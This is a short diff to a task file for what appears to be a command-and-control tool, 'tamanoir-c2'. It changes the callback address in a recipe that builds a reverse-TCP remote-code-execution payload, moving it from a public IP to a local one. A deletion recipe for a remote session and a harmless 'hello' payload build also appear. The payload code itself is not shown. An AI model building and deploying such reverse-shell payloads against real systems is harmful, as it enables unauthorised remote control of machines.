@@ -55,7 +55,7 @@ c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
 
 # Rce build (run on c2 server)
 rce_build_reverse_tcp :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=82.66.170.54 PORT=8082"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8082"
 
 rce_build_hello :
     ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
